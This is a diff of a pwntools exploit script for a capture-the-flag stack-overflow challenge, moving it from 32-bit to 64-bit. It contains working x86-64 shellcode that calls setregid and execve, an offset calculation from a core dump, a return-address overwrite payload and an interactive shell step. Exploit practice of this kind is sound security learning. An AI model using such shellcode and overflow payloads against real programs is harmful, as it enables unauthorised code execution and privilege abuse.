@@ -3,41 +3,44 @@ import os
 
 DEBUG = False 
 
+context.arch = "x86-64"
+context.bits = 64
+
 shellcode = asm('''
-push   ebp
-pop    edx # store ebp in edx
+push   0x6c
+pop    rax
+syscall
 
-push   0x31 # zero eax
-pop    eax
-xor    al, 0x31
-dec    eax # gets us ff
+push   rax
+push   rax
+pop    rdi
+pop    rsi
+push   0x72
+pop    rax
+syscall
 
-xor [edx + 0x1e], al
-xor [edx + 0x1f], al
+push   0x31
+pop    rax
+xor    al,0x31
+push   rax
+push   rax
+pop    rsi
+pop    rdx
+push   0x7a
 
-push 0x7a # push z on the stack
-push esp
-pop  ebx
+push   rsp
+pop    rdi
+push   0x3b
+pop    rax
+syscall
+''')
 
-push 0x31
-pop  eax
-xor  al, 0x31
-push eax
-push eax
-pop  ecx
-pop  edx
-
-push 0xb
-pop  eax
-
-.dc.b 0x32, 0x7f # these ^ ff = int 0x80
-''') 
 
 
 print(disasm(shellcode))
 
 env = {"PATH":"$PATH:."}
-file = './stack-ovfl-no-envp-no-argv-32'
+file = './stack-ovfl-no-envp-no-argv-64'
 shellcode_file = f'./{shellcode.decode("utf8")}'
 if not os.path.isfile(shellcode_file):
     os.symlink(file, shellcode_file)
@@ -51,8 +54,7 @@ io.wait()
 core = io.corefile
 shellcode_address = core.stack.find(shellcode)
 print(shellcode_address)
-# shellcode_address = 0xffffdf9b
-max_len = cyclic(10000).find(p32(core.fault_addr))
+max_len = cyclic(10000).find(p64(core.fault_addr))
 print(max_len)
 os.unlink(core.path) 
 
@@ -62,7 +64,7 @@ if DEBUG:
     context.terminal = ['tmux', 'splitw', '-h']
     io = gdb.debug(shellcode_file, env=env, gdbscript='''
 b main
-b *0x08048546
+b *0x0000555555554826
 continue
 ''')
 else:
@@ -72,13 +74,14 @@ else:
 # BEGIN CHALLENGE-SPECIFIC CODE
 
 
-payload = int(max_len / 4) * p32(shellcode_address) + p32(shellcode_address)
+payload = int(max_len) * b"A" + p64(shellcode_address)
 io.send(payload)
+io.interactive()
 
 # END CHALLENGE-SPECIFIC CODE
 # BEGIN FLAG RETRIEVAL BOILERPLATE
 
-import re
-io.sendlineafter(b'Hello', b'cat flag')
-flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
-print(flag)
+# import re
+# io.sendlineafter(b'Hello', b'cat flag')
+# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
+# print(flag)
